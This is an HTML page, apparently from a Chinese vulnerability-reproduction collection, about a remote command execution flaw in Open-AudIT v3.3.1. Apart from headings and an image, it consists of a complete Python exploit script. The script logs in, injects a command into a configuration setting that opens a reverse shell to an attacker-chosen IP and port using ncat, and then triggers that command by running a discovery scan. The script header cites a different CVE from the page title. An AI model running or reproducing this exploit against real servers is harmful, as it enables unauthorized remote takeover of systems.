<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2020-12078open-audit-v331-远程命令执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-12078</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Open-AudIT v3.3.1 </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Open-AudIT v3.3.1</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span><img src="Web安全/Open-AudIT/%ef%bc%88CVE-2020-12078%ef%bc%89Open-AudIT%20v3.3.1%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="346" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">OpenAudIT-postauth-rce.py</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/python3</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Exploit Title: Open-AudIT Professional v3.3.1 Remote Code Execution</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Date: 22/04/2020</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Exploit Author: Askar (@mohammadaskar2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># CVE: CVE-2020-8813</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Vendor Homepage: https://opmantek.com/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Version: v3.3.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Tested on: Ubuntu 18.04 / PHP 7.2.24</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import warnings</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import random</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import string</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from bs4 import BeautifulSoup</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from urllib.parse import quote</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">warnings.filterwarnings(&quot;ignore&quot;, category=UserWarning, module=&#39;bs4&#39;)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if len(sys.argv) != 6:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[~] Usage : ./openaudit-exploit.py url username password ip port&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">url = sys.argv[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">username = sys.argv[2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">password = sys.argv[3]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ip = sys.argv[4]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">port = sys.argv[5]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">request = requests.session()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def inject_payload():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;configuration_path = url+&quot;/en/omk/open-audit/configuration/90&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = &#39;data={&quot;data&quot;:{&quot;id&quot;:&quot;90&quot;,&quot;type&quot;:&quot;configuration&quot;,&quot;attributes&quot;:{&quot;value&quot;:&quot;;ncat${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s${IFS};&quot;}}}&#39; % (ip, port)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;request.patch(configuration_path, data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Payload injected in settings&quot;)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def start_discovery():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;discovery_path = url+&quot;/en/omk/open-audit/discoveries/create&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_discovery_path = url+&quot;/en/omk/open-audit/discoveries&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;scan_name = &quot;&quot;.join([random.choice(string.ascii_uppercase) for i in range(10)])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;req = request.get(discovery_path)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;response = req.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;soup = BeautifulSoup(response, &quot;html5lib&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;token = soup.findAll(&#39;input&#39;)[5].get(&quot;value&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;buttons = soup.findAll(&quot;button&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;headers = {&quot;Referer&quot; : discovery_path}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;request_data = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][name]&quot;:scan_name,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][subnet]&quot;:&quot;10.10.10.1/24&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][ad_server]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][ad_domain]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;submit&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[type]&quot;:&quot;discoveries&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[access_token]&quot;:token,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][complete]&quot;:&quot;y&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][org_id]&quot;:&quot;1&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][type]&quot;:&quot;subnet&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][devices_assigned_to_org]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][devices_assigned_to_location]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][discovery_scan_option_id]&quot;:&quot;1&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][ping]&quot;:&quot;y&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][service_version]&quot;:&quot;n&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][open|filtered]&quot;:&quot;n&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][filtered]&quot;:&quot;n&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][timing]&quot;:&quot;4&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][nmap_tcp_ports]&quot;:&quot;0&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][nmap_udp_ports]&quot;:&quot;0&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][tcp_ports]&quot;:&quot;22,135,62078&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][udp_ports]&quot;:&quot;161&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][timeout]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][exclude_tcp_ports]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][exclude_udp_ports]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][exclude_ip]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][nmap][ssh_ports]&quot;:&quot;22&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_dbus]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_fqdn]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_dns_fqdn]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_dns_hostname]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_hostname]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_hostname_dbus]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_hostname_serial]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_hostname_uuid]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_ip]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_ip_no_data]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_mac]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_mac_vmware]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_serial]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_serial_type]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_sysname]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_sysname_serial]&quot;:&quot;&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;data[attributes][other][match][match_uuid]&quot;:&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Creating discovery ..&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;req = request.post(post_discovery_path, data=request_data, headers=headers, allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;disocvery_url = url + req.headers[&#39;Location&#39;] + &quot;/execute&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Triggering payload ..&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Check your nc ;)&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;request.get(disocvery_url)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def login():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;login_info = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;redirect_url&quot;: &quot;/en/omk/open-audit&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;username&quot;: username,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;password&quot;: password</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;login_request = request.post(url+&quot;/en/omk/open-audit/login&quot;, login_info)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;login_text = login_request.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &quot;There was an error authenticating&quot; in login_text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if login():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] LoggedIn Successfully&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;inject_payload()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;start_discovery()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[-] Cannot login!&quot;)</span></p></body>
</html>
